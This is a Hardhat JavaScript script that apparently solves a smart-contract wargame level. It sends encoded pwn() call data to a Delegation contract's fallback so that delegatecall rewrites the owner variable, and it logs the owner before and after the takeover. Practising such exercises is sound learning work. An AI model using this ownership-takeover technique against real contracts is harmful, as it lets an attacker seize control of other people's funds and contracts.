const hre = require("hardhat");
const delegateABI = require("../artifacts/contracts/Challenge 6/Delegation.sol/Delegate.json"); // get ABI

async function main() {
  // First get victim contract to call consecutiveWins public variable
  const Victim = await ethers.getContractFactory("Delegation");
  const victim = await Victim.attach(
    "0xb76421B596Aa6b154f07af09694255a3427b750d" // This is the contract address that you get from starting your instance
  );

  // We can check who the owner initially is
  const owner1 = await victim.owner();
  console.log("The owner initially is ", owner1);

  // Now we will call the fallback function from the Delegation contract
  // We need to pass the correct msg.data to make the delegateCall
  // The msg.data has to somehow call the pwn function
  const delgateInterface = new ethers.utils.Interface(delegateABI.abi); // turn it into an interface to call encodeFunctionData
  const data = delgateInterface.encodeFunctionData(`pwn`, []); // get data to call pwn function in delegate contract

  const [owner, addr1] = await ethers.getSigners(); // get your account
  const attack = await owner.sendTransaction({
    to: victim.address, // no need to send eth
    data: data, // we pass in the data variable obtained above
    gasLimit: 100000, // to not get error gas
  });

  await attack.wait(1);

  // Verify that you are now the owner
  const owner2 = await victim.owner();
  console.log("Now the owner is ", owner2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
